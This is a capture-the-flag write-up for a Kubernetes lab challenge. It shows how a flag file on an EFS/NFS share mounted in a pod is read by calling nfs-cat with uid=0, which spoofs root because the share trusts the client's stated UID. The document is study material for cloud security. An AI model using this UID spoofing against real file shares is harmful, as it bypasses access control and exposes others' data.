---
tags:
  - Kubernetes
  - EFS
title: K8S LAN Party - Exposed File Share
description: The problem of old-school network file shares in the cloud
reference: https://k8slanparty.com/challenge/3
---

## Challenge

The targeted big corp utilizes outdated, yet cloud-supported technology for data storage in production. But oh my, this technology was introduced in an era when access control was **only network-based**.

## Solution

### 1. check what is mounted in the pod

- found `/efs` is mounted in the pod.
- `/efs` is an EFS file system. EFS is a fully managed, elastic, shared file system that can be mounted on Amazon EC2 instances.

```
player@wiz-k8s-lan-party:~$ df
Filesystem                                                1K-blocks    Used        Available Use% Mounted on
overlay                                                   314560492 8889008        305671484   3% /
fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com:/ 9007199254739968       0 9007199254739968   0% /efs
tmpfs                                                      62022172      12         62022160   1% /var/run/secrets/kubernetes.io/serviceaccount
tmpfs                                                         65536       0            65536   0% /dev/null
```

### 2. Check the `/efs` directory

found the `flag.txt` but we dont have the permission to read it.

```
player@wiz-k8s-lan-party:/efs$ cat flag.txt 
cat: flag.txt: Permission denied
player@wiz-k8s-lan-party:/efs$ ls -alt
total 8
drwxr-xr-x 1 player player   51 Jan  1 13:01 ..
---------- 1 daemon daemon   73 Mar 11  2024 flag.txt
drwxr-xr-x 2 root   root   6144 Mar 11  2024 .
```

### 3. Get more information about the EFS mount

```
player@wiz-k8s-lan-party:/efs$ mount | grep efs
fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com:/ on /efs type nfs4 (ro,relatime,vers=4.1,rsize=1048576,wsize=1048576,namlen=255,hard,noresvport,proto=tcp,timeo=600,retrans=2,sec=sys,clientaddr=192.168.48.9,local_lock=none,addr=192.168.124.98)
```

### 4. Try to mount the EFS file system in the new directory

Failed.

```
player@wiz-k8s-lan-party:~$ mount -t efs -o tls fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com:/ ~/efs
mount: /home/player/efs: must be superuser to use mount.
```

### 5. Found some nfs tools in the `/usr/bin` directory

```
player@wiz-k8s-lan-party:/usr/bin$ ls | grep nfs
nfs-cat
nfs-cp
nfs-ls
```

### 6. Try `nfs-cat` to read the `flag.txt` file


```
player@wiz-k8s-lan-party:/usr/bin$ nfs-cat "nfs://192.168.124.98//flag.txt?version=4.1&uid=0"
wiz_k8s_lan_party{old-school-network-file-shares-infiltrated-the-cloud!}
```

> Note: we have to quote the URL with double quotes, otherwise the `uid=0` part of the URL will not be treated as part of the URL.

URL-FORMAT:

```
URL-FORMAT:
===========
Libnfs uses RFC2224 style URLs extended with some minor libnfs extensions.
The basic syntax of these URLs is :

nfs://[<username>@]<server|ipv4|ipv6>[:<port>]/path[?arg=val[&arg=val]*]

Special characters in 'path' are escaped using %-hex-hex syntax.

For example '?' must be escaped if it occurs in a path as '?' is also used to
separate the path from the optional list of url arguments.

Example:
nfs://127.0.0.1/my?path/?version=4
must be escaped as
nfs://127.0.0.1/my%3Fpath/?version=4

Arguments supported by libnfs are :
 tcp-syncnt=<int>  : Number of SYNs to send during the session establish
                     before failing setting up the tcp connection to the
                     server.
 uid=<int>         : UID value to use when talking to the server.
                     default it 65534 on Windows and getuid() on unixen.
 gid=<int>         : GID value to use when talking to the server.
```

Refs:

1. https://github.com/sahlberg/libnfs
2. https://www.rfc-editor.org/rfc/rfc2224.html
